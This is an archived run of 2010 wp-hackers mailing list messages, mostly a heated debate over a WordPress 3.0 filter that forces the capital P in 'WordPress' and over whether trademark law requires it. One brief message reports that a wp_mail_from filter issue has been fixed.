	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com>
	<4C3250B0.5070900@laptoptips.ca>
	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>
	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>
	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>
	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>
	<4C32AEE0.5070803@mullenweg.com>
Message-ID: <vfERFGFhftMMFweO@dsl-217-155-35-239.zen.co.uk>

In message <4C32AEE0.5070803 at mullenweg.com>, Matt Mullenweg 
<m at mullenweg.com> writes
>
>As I said before, you are in /complete control/ of your site. It's a 
>single line to remove a filter. If you don't like the filter, vote with 
>your feet or with a plugin. If the function cause a non-trivial number 
>of people to avoid 3.0, leave WP, or install a plugin to deactivate I 
>would seriously reconsider it. In the absence of that, there are a 
>1,001 better places to focus my attention with regards to WordPress.

An interesting perspective, though I think that your attention should 
probably be focused on things like this.  You have a strong community 
backlash against this, and, as another has said before fairly 
eloquently, the attitude of the core team is coming across as being "you 
don't like it, you lump it". It smacks of arrogance, which is never a 
pleasant thing.  I don't recall a ticket in my recent memory which has 
had so many -1s and revert comments, and yet still lives on.  That it's 
recently been demoted in priority is another smack in the teeth for 
those that have expressed their opinion against it.

>
>If someone made a better version of the function and benchmarked it 
>next to the current or some of our other formatting functions in some 
>real-world situations, that would be useful too, and add to the 
>discussion rather than the noise. I'd love to see wp-hackers return to 
>more, well, hacking.
>

Agreed, but as has already been stated in the ticket a better version of 
the filter - IE one that discriminates against all the possible issues 
whilst correcting your desired mis-spellings - is almost certain to use 
more resource than the current one, which just doesn't care.

I'm loath to be involved in a debate around what is or is not proper, my 
feeling on this is simply that it's caused users to experience issues 
with their sites, which they've posted about on the forums.  Many of 
these users have no clue how to remove a filter, and, quite rightly, 
would not expect to have to install a plugin to do so after the 3.0 
upgrade, without any warning.

Whilst it may be the case that the filter has existed on .com, that does 
not preclude any issues and, indeed, most of the issues that have come 
about are down to where the Wordpress/ [sic] directory has been placed, 
or what URLs people use to access their content, something which .com 
does not have to deal with.

I think that it's the arbritary nature of this filter's implementation 
and the subsequent refusal to revert that has people's backs up, and 
both that *and* the actual technical issues could largely have been 
avoided with some pre-discussion and, perhaps, a note of warning to 
upgraders who might find themselves affected.

That's my 2p worth, and all I shall say on the matter.

-- 
mrmist

From harry at thedextrousweb.com  Tue Jul  6 08:47:23 2010
From: harry at thedextrousweb.com (Harry Metcalfe)
Date: Tue, 06 Jul 2010 09:47:23 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C32AEE0.5070803@mullenweg.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>	<4C2ED16D.9050907@szub.net>
	<001201cb1aa2$e1c9bd30$a55d3790$@com>	<4C3250B0.5070900@laptoptips.ca>	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>
	<4C32AEE0.5070803@mullenweg.com>
Message-ID: <4C32ED9B.5060207@thedextrousweb.com>

Well, actually, most people aren't technical, and therefore in practice 
(if not in theory) are very far from in "complete control" of their blog.

Even if you disagree with that, there seems to me to be a strong 
indication here, and on Trac, that the majority of people commenting 
think this should either go away completely, or be added to the 
spellchecker. Does this count for nothing?

Do you really think it's reasonable to say that we were just all waiting 
in the wings for something easy to bitch about? That seems astonishingly 
cynical to me.

Harry


On 06/07/10 05:19, Matt Mullenweg wrote:
> On 7/5/2010 11:46 PM, Jeff Jason wrote:
>> Why don't people care a little more about implementation and design
>> decisions that actually matter.
>
> You're completely right. The more trivial the topic, the more people
> likely to have an opinion, because it's easier to do so.
>
> The fundamental flaw of mailing lists, and arguments like this thread,
> is that they come to be dominated in volume by the people who have the
> most time to post to them.
>
> As I said before, you are in /complete control/ of your site. It's a
> single line to remove a filter. If you don't like the filter, vote with
> your feet or with a plugin. If the function cause a non-trivial number
> of people to avoid 3.0, leave WP, or install a plugin to deactivate I
> would seriously reconsider it. In the absence of that, there are a 1,001
> better places to focus my attention with regards to WordPress.
>
> If someone made a better version of the function and benchmarked it next
> to the current or some of our other formatting functions in some
> real-world situations, that would be useful too, and add to the
> discussion rather than the noise. I'd love to see wp-hackers return to
> more, well, hacking.
>

From Gavin.Pearce at 3seven9.com  Tue Jul  6 09:32:45 2010
From: Gavin.Pearce at 3seven9.com (Gavin Pearce)
Date: Tue, 6 Jul 2010 10:32:45 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C32ED9B.5060207@thedextrousweb.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>	<4C2ED16D.9050907@szub.net><001201cb1aa2$e1c9bd30$a55d3790$@com>	<4C3250B0.5070900@laptoptips.ca>	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com><4C32AEE0.5070803@mullenweg.com>
	<4C32ED9B.5060207@thedextrousweb.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E2FAC@tbs-sbs01.TBS.local>

I fully agree with Harry here:

1) The vast majority of people seem to be in favor for it being removed
(REF# TRAC, this thread, forums).
2) It *does* break things for many users (some of them are non-technical
so they won't be editing source) - fact.
3) The action the function does is so trivial, and non-critical, it
shouldn't even be core-code IMHO.

Considering the status of the WordPress project - reason 1 should be
enough on its own, but with 2 combined, it's non-debatable. The function
must be removed. 

At the end of the day who CARES if WordPress is Wordpress, Wordress,
wordPress or anything else - remove the function and it'll fix things
for users complaining. If you really want it, use add_filter to add it
back in.

Matt - also FYI, I don't have *any* spare time myself to hang around
mailing lists arguing about points like this, in fact, I have much
better things to be doing than persuading you why you're wrong. That
said, you clearly have time spare for snide remarks yourself though?

At the end of the day, I know it's your code, and your 'baby', but now
your babys all grown up, you have to step back and give it room to think
for itself - eg Wordpress Foundation.

Views here are only in relation to this function - I know users
complaining isn't always a good reason to alter code.

Comments welcome of course.

Gav

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Harry
Metcalfe
Sent: 06 July 2010 09:47
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Putting the P in WordPress

Well, actually, most people aren't technical, and therefore in practice 
(if not in theory) are very far from in "complete control" of their
blog.

Even if you disagree with that, there seems to me to be a strong 
indication here, and on Trac, that the majority of people commenting 
think this should either go away completely, or be added to the 
spellchecker. Does this count for nothing?

Do you really think it's reasonable to say that we were just all waiting

in the wings for something easy to bitch about? That seems astonishingly

cynical to me.

Harry


On 06/07/10 05:19, Matt Mullenweg wrote:
> On 7/5/2010 11:46 PM, Jeff Jason wrote:
>> Why don't people care a little more about implementation and design
>> decisions that actually matter.
>
> You're completely right. The more trivial the topic, the more people
> likely to have an opinion, because it's easier to do so.
>
> The fundamental flaw of mailing lists, and arguments like this thread,
> is that they come to be dominated in volume by the people who have the
> most time to post to them.
>
> As I said before, you are in /complete control/ of your site. It's a
> single line to remove a filter. If you don't like the filter, vote
with
> your feet or with a plugin. If the function cause a non-trivial number
> of people to avoid 3.0, leave WP, or install a plugin to deactivate I
> would seriously reconsider it. In the absence of that, there are a
1,001
> better places to focus my attention with regards to WordPress.
>
> If someone made a better version of the function and benchmarked it
next
> to the current or some of our other formatting functions in some
> real-world situations, that would be useful too, and add to the
> discussion rather than the noise. I'd love to see wp-hackers return to
> more, well, hacking.
>
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From piemanek at gmail.com  Tue Jul  6 09:37:21 2010
From: piemanek at gmail.com (Simon Blackbourn)
Date: Tue, 6 Jul 2010 10:37:21 +0100
Subject: [wp-hackers] wp_mail_from and wp_mail_from_name
In-Reply-To: <AANLkTinIxQRcxlw3FXAtrW8bxEvhIDVGJ92HrgAnPBg0@mail.gmail.com>
References: <AANLkTikdy1xR7VPZ3Wtc3dYFM2fdv202pO1zGnDQVC5r@mail.gmail.com>
	<004601cb17b5$98b0bcb0$ca123610$@com>
	<AANLkTinIxQRcxlw3FXAtrW8bxEvhIDVGJ92HrgAnPBg0@mail.gmail.com>
Message-ID: <AANLkTim7toaiEiwT59_jLKxPnaTMhKvkFoRcs7_vPuFQ@mail.gmail.com>

thanks very much for all the suggestions on this one - it turns out that
somewhat embarassingly that i'd left some old code languishing in
functions.php that was causing the problem. both filters are now working
exactly as they should.

From wordpress at zed1.com  Tue Jul  6 09:53:24 2010
From: wordpress at zed1.com (Mike Little)
Date: Tue, 6 Jul 2010 10:53:24 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E2FAC@tbs-sbs01.TBS.local>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com> 
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com> 
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com> 
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com> 
	<4C3250B0.5070900@laptoptips.ca>
	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com> 
	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com> 
	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>
	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com> 
	<4C32AEE0.5070803@mullenweg.com> <4C32ED9B.5060207@thedextrousweb.com> 
	<CD47955B7E065D48AB5CF226C2ED75C02E2FAC@tbs-sbs01.TBS.local>
Message-ID: <AANLkTinHGUmxYibfj8C3v9K5MBgctxGNljF1hIe5N8v1@mail.gmail.com>

On 6 July 2010 10:32, Gavin Pearce <Gavin.Pearce at 3seven9.com> wrote:

>
> 1) The vast majority of people seem to be in favor for it being removed
> (REF# TRAC, this thread, forums).
>

A problem here, is that anyone thinks 20 people in an email conversation is
a 'vast majority'. It quite simply is not. So the vast majority *of
WordPress users* have no opinion on this.



> 2) It *does* break things for many users (some of them are non-technical
>

Again, "many users" is simply not true in the grand scale of things, and
WordPress *is* on a grand scale.



> so they won't be editing source) - fact.
>

As has already been pointed out, there is a plugin to turn it off, so no-one
has to edit source thanks to the wonderful thing that is WordPress and it's
auto plugin installation. It is no harder than installing any other plugin,
several of which turn off other filters that are active by default (about
which I see no protracted debates).



>
> At the end of the day who CARES if WordPress is Wordpress, Wordress,
> wordPress or anything else -


As has been pointed out on this thread, WordPress is a trademark, and as
such *must* be actively protected, otherwise the trademark status will be
lost.


Mike
-- 
Mike Little
http://zed1.com/

From ben at thewhiteroom.net  Tue Jul  6 10:14:09 2010
From: ben at thewhiteroom.net (Ben Huson)
Date: Tue, 6 Jul 2010 11:14:09 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTinHGUmxYibfj8C3v9K5MBgctxGNljF1hIe5N8v1@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com>
	<4C3250B0.5070900@laptoptips.ca>
	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>
	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>
	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>
	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>
	<4C32AEE0.5070803@mullenweg.com>
	<4C32ED9B.5060207@thedextrousweb.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FAC@tbs-sbs01.TBS.local>
	<AANLkTinHGUmxYibfj8C3v9K5MBgctxGNljF1hIe5N8v1@mail.gmail.com>
Message-ID: <AANLkTinkfC7skDGnMm2UGY6E3teku1Rccfmdjhp9Mssv@mail.gmail.com>

My initial input on trac was that I though this was a bad idea and my
main concern was the perception that WordPress was altering something
you have typed without telling you (I think it's this perception issue
that has sparked this torrent of feedback).

I am not at all against protecting WordPress trademark and this fix is
actually quite a good way to do that. As long as it doesn't break
stuff for people, only affecting text and not links, filenames etc,
that is fine.

The only real downsides to all this are:

1. You cannot write "You spell it WordPress not Wordpress" (If you
want to write this you probably know or can find out how to remove the
filter)

2. You cannot spot the difference between a die-hard WordPress fan and
a rookie merely by looking at their content.

That's all. Now let's move on.

- Ben

On 6 July 2010 10:53, Mike Little <wordpress at zed1.com> wrote:
> On 6 July 2010 10:32, Gavin Pearce <Gavin.Pearce at 3seven9.com> wrote:
>
>>
>> 1) The vast majority of people seem to be in favor for it being removed
>> (REF# TRAC, this thread, forums).
>>
>
> A problem here, is that anyone thinks 20 people in an email conversation is
> a 'vast majority'. It quite simply is not. So the vast majority *of
> WordPress users* have no opinion on this.
>
>
>
>> 2) It *does* break things for many users (some of them are non-technical
>>
>
> Again, "many users" is simply not true in the grand scale of things, and
> WordPress *is* on a grand scale.
>
>
>
>> so they won't be editing source) - fact.
>>
>
> As has already been pointed out, there is a plugin to turn it off, so no-one
> has to edit source thanks to the wonderful thing that is WordPress and it's
> auto plugin installation. It is no harder than installing any other plugin,
> several of which turn off other filters that are active by default (about
> which I see no protracted debates).
>
>
>
>>
>> At the end of the day who CARES if WordPress is Wordpress, Wordress,
>> wordPress or anything else -
>
>
> As has been pointed out on this thread, WordPress is a trademark, and as
> such *must* be actively protected, otherwise the trademark status will be
> lost.
>
>
> Mike
> --
> Mike Little
> http://zed1.com/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From ash at thinkinginvain.com  Tue Jul  6 10:43:39 2010
From: ash at thinkinginvain.com (Ash Goodman)
Date: Tue, 6 Jul 2010 18:43:39 +0800
Subject: [wp-hackers] wp-hackers Digest, Vol 66, Issue 18
In-Reply-To: <mailman.9505.1278411261.1338.wp-hackers@lists.automattic.com>
References: <mailman.9505.1278411261.1338.wp-hackers@lists.automattic.com>
Message-ID: <AANLkTinrwATxC54jEGOToJxG5eEcQwvq4pzxPZt1184t@mail.gmail.com>

Um, sorry but no.

Forcing people to correct the spelling is not trademark protection.
That's just a ridiculous thing to say. wOrdpRess and Matt and Co have
absolutely no right to force their preferred spelling on the content I
create. It's my expressive freedom, *not* yours.

Yes, this is a tiny, even trivial issue. But the principle is not. And
trying to belittle those who feel strongly about their expressive
freedoms, well that's arrogant and childish.

Matt M. Your rights end where mine begin. You do not own my blog, nor
my copy of worDpreSs. In fact you don't own Wordprs at all you are its
custodian and you have no right to force me to spell the way you wish
me to. It is censorship. The fact that the community feels as strongly
about it as they do should be reason enough to change it.

At the very least you should give them an option "Turn on wordpress
spelling police"

The biggest irony of all about this round of discussion, it started by
me pointing out the arrogance with which Matt M acted in regards to
how he spoke to another user of this mailing list, he replied by
condemning my spelling of worDpreSs (totally ignoring my point):
further arrogance, and now has spewed even more in defense of what has
proven to be an amazingly stupid idea.

To say there is a plugin for it isn't good enough. There should be a
plugin to add the filter, not remove it!

Over the last few months I have made my first foray into communicating
with a community of developers on an open source project and to be
honest, much of the behavior I see disgusts me. People are only
allowed an opinion as long as it agrees with the 'party line' anything
outside that is derided and the speaker belittled.

Matt you seem to forget you are the leader of this community. You are
expected to behave better. You don't get to be arrogant and tell
people to shove off. And "if you don't like it you can take your toys
and go home" attitude isn't what I, or anyone else with respect,
expects to see and hear.

I think your brilliant, you have achieved a lot and at a very young
age. Good on you mate! But I gotta tell you, you don't act successful,
you act spoiled. I have loads of respect for you, but every time I see
you act like this my respect level drops.

Keep this up and *you* will be responsible for splintering the
community, all it takes is a few good, pissed off programmers and
wordpress is forked. I for one do not want to see this happen, but I
can see it coming as clear as day.

Of course, I am nobody so I don't expect to move you. But don't expect
me to spend any more time contributing to this list either. Maybe that
doesn't matter, maybe my contributions would have been worthless,
maybe not. Now none of us will ever know. How many others have you
lost already? How many more before it's too late?



On 6 July 2010 18:14,  <wp-hackers-request at lists.automattic.com> wrote:
> As has been pointed out on this thread, WordPress is a trademark, and as
> such *must* be actively protected, otherwise the trademark status will be
> lost.

From Gavin.Pearce at 3seven9.com  Tue Jul  6 10:53:52 2010
From: Gavin.Pearce at 3seven9.com (Gavin Pearce)
Date: Tue, 6 Jul 2010 11:53:52 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTinHGUmxYibfj8C3v9K5MBgctxGNljF1hIe5N8v1@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com>
	<4C3250B0.5070900@laptoptips.ca><AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>
	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>
	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com><AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>
	<4C32AEE0.5070803@mullenweg.com>
	<4C32ED9B.5060207@thedextrousweb.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FAC@tbs-sbs01.TBS.local>
	<AANLkTinHGUmxYibfj8C3v9K5MBgctxGNljF1hIe5N8v1@mail.gmail.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E2FB0@tbs-sbs01.TBS.local>

> A problem here, is that anyone thinks 20 people in an email conversation is
> a 'vast majority'. It quite simply is not. So the vast majority *of
> WordPress users* have no opinion on this.

Not really a fair sample here - 20 people who have strong technical background of Wordpress - one just need flick through TRAC or various forums to see of non-technical users reporting the same issue. It shouldn't matter how many people say it's a bug - if just one person reports a bug, (bug purposely used instead of feature) that's enough reason to look into fixing it. This does break things for some non-technical users. I consider the fact it breaks things to be the end of discussion on whether it causes issues or not - it needs looking into one way or another.

> Again, "many users" is simply not true in the grand scale of things, and
> WordPress *is* on a grand scale.

20 users reporting the same issue is "many" users in comparison to many of the WordPress bug reports.

> As has already been pointed out, there is a plugin to turn it off, so no-one
> has to edit source thanks to the wonderful thing that is WordPress and it's
> auto plugin installation. It is no harder than installing any other plugin,
> several of which turn off other filters that are active by default (about
> which I see no protracted debates).

Core code should only be code that really matters - filters like this should be "installed" by a plugin, not "deactivated" by a plugin.

> As has been pointed out on this thread, WordPress is a trademark, and as
> such *must* be actively protected, otherwise the trademark status will be
> lost.

As also pointed on this thread - that's complete rubbish. If enough people start writing MicroSoft, that doesn't "loose" Microsoft's right to the trademark. The only time this would be any issue in the slightest, is when trying to protect an "unregistered" trademark. 

End users writing Wordpress, Wordress, wOrDpReSs, WORDPRESS etc doesn't affect the trademark in any way whatsoever. (slightly different if WordPress foundation started doing it).

(http://www.uspto.gov/trademarks/law/index.jsp | http://www.ipo.gov.uk/types/tm.htm)

Gav


-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Mike Little
Sent: 06 July 2010 10:53
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Putting the P in WordPress

On 6 July 2010 10:32, Gavin Pearce <Gavin.Pearce at 3seven9.com> wrote:

>
> 1) The vast majority of people seem to be in favor for it being removed
> (REF# TRAC, this thread, forums).
>

A problem here, is that anyone thinks 20 people in an email conversation is
a 'vast majority'. It quite simply is not. So the vast majority *of
WordPress users* have no opinion on this.



> 2) It *does* break things for many users (some of them are non-technical
>

Again, "many users" is simply not true in the grand scale of things, and
WordPress *is* on a grand scale.



> so they won't be editing source) - fact.
>

As has already been pointed out, there is a plugin to turn it off, so no-one
has to edit source thanks to the wonderful thing that is WordPress and it's
auto plugin installation. It is no harder than installing any other plugin,
several of which turn off other filters that are active by default (about
which I see no protracted debates).



>
> At the end of the day who CARES if WordPress is Wordpress, Wordress,
> wordPress or anything else -


As has been pointed out on this thread, WordPress is a trademark, and as
such *must* be actively protected, otherwise the trademark status will be
lost.


Mike
-- 
Mike Little
http://zed1.com/
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From wordpress at zed1.com  Tue Jul  6 11:52:12 2010
From: wordpress at zed1.com (Mike Little)
Date: Tue, 6 Jul 2010 12:52:12 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E2FB0@tbs-sbs01.TBS.local>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com> 
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com> 
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com> 
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com> 
	<4C3250B0.5070900@laptoptips.ca>
	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com> 
	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com> 
	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>
	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com> 
	<4C32AEE0.5070803@mullenweg.com> <4C32ED9B.5060207@thedextrousweb.com> 
	<CD47955B7E065D48AB5CF226C2ED75C02E2FAC@tbs-sbs01.TBS.local> 
	<AANLkTinHGUmxYibfj8C3v9K5MBgctxGNljF1hIe5N8v1@mail.gmail.com> 
	<CD47955B7E065D48AB5CF226C2ED75C02E2FB0@tbs-sbs01.TBS.local>
Message-ID: <AANLkTikCbAM1PNhO8LH-chEup6BGx934H5Lk-xHzfSV-@mail.gmail.com>

On 6 July 2010 11:53, Gavin Pearce <Gavin.Pearce at 3seven9.com> wrote:

> > As has been pointed out on this thread, WordPress is a trademark, and as
> > such *must* be actively protected, otherwise the trademark status will be
> > lost.
>
> As also pointed on this thread - that's complete rubbish. If enough people
> start writing MicroSoft, that doesn't "loose" Microsoft's right to the
> trademark. The only time this would be any issue in the slightest, is when
> trying to protect an "unregistered" trademark.
>
> End users writing Wordpress, Wordress, wOrDpReSs, WORDPRESS etc doesn't
> affect the trademark in any way whatsoever. (slightly different if WordPress
> foundation started doing it).
>
> (http://www.uspto.gov/trademarks/law/index.jsp |
> http://www.ipo.gov.uk/types/tm.htm)
>
>

Not rubbish at all, but standard practice in law, in both the US and the UK
(and many other territories). Here' s one reference
http://cyber.law.harvard.edu/metaschool/fisher/domain/tm.htm#6 and here's
another http://www.askjim.biz/answers/losing-rights-to-a-trademark_397.php
there
are many if you wish to search.

If you do not actively police your trademark, you can lose the rights to it.

Mike
-- 
Mike Little
http://zed1.com/

From harry at thedextrousweb.com  Tue Jul  6 12:00:31 2010
From: harry at thedextrousweb.com (Harry Metcalfe)
Date: Tue, 06 Jul 2010 13:00:31 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTikCbAM1PNhO8LH-chEup6BGx934H5Lk-xHzfSV-@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com>
	<4C3250B0.5070900@laptoptips.ca>	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>
	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>
	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>
	<4C32AEE0.5070803@mullenweg.com>
	<4C32ED9B.5060207@thedextrousweb.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FAC@tbs-sbs01.TBS.local>
	<AANLkTinHGUmxYibfj8C3v9K5MBgctxGNljF1hIe5N8v1@mail.gmail.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FB0@tbs-sbs01.TBS.local>
	<AANLkTikCbAM1PNhO8LH-chEup6BGx934H5Lk-xHzfSV-@mail.gmail.com>
Message-ID: <4C331ADF.7070901@thedextrousweb.com>

> Not rubbish at all, but standard practice in law, in both the US and the UK
> (and many other territories). Here' s one reference
> http://cyber.law.harvard.edu/metaschool/fisher/domain/tm.htm#6 and here's
> another http://www.askjim.biz/answers/losing-rights-to-a-trademark_397.php
> there
> are many if you wish to search.
>
> If you do not actively police your trademark, you can lose the rights to it.
>
> Mike

Policing your trademark means preventing unauthorised use of it, in 
order to stop it becoming a generic word rather than one strongly 
associated with your product. As both of those references explain.

Forcing people to adopt your spelling is not required to protect a 
trademark. Even if it were, a spellchecker -- as with Apple's devices -- 
is a better way to do it, for reasons already rehearsed.

This trademark issue is a total red herring.


-- 
Harry Metcalfe
Tel: 07790 559 876
Web: http://thedextrousweb.com
Twitter: @harrym, @dextrousweb

From Gavin.Pearce at 3seven9.com  Tue Jul  6 12:09:31 2010
From: Gavin.Pearce at 3seven9.com (Gavin Pearce)
Date: Tue, 6 Jul 2010 13:09:31 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTikCbAM1PNhO8LH-chEup6BGx934H5Lk-xHzfSV-@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com>
	<4C3250B0.5070900@laptoptips.ca><AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>
	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>
	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com><AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>
	<4C32AEE0.5070803@mullenweg.com>
	<4C32ED9B.5060207@thedextrousweb.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FAC@tbs-sbs01.TBS.local>
	<AANLkTinHGUmxYibfj8C3v9K5MBgctxGNljF1hIe5N8v1@mail.gmail.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FB0@tbs-sbs01.TBS.local>
	<AANLkTikCbAM1PNhO8LH-chEup6BGx934H5Lk-xHzfSV-@mail.gmail.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E2FB2@tbs-sbs01.TBS.local>

> Not rubbish at all, but standard practice in law, in both the US and the UK
> (and many other territories). Here' s one reference

Both your links only list the following scenarios for loosing trademarks:

1# trademark rights may be lost through genericity
2# improper licensing and assignment

Point 6 from which you linked to stated:
Can trademark rights be lost?
"The rights to a trademark can be lost through abandonment, improper licensing or assignment, or genericity."

None of the above apply here.

The closest condition I can find is that you have to prove you are using your trademark and it isn't abandoned - I definitely can't find any articles that suggest you must force users to match the case of your Trademark else risk losing it.

I do agree that internally you have to police your trademark, make sure employees are using the correct one, and in the correct way yes.

Mircosoft - the experts on trademark law and rights/licensing enforcement that they are, give good examples.

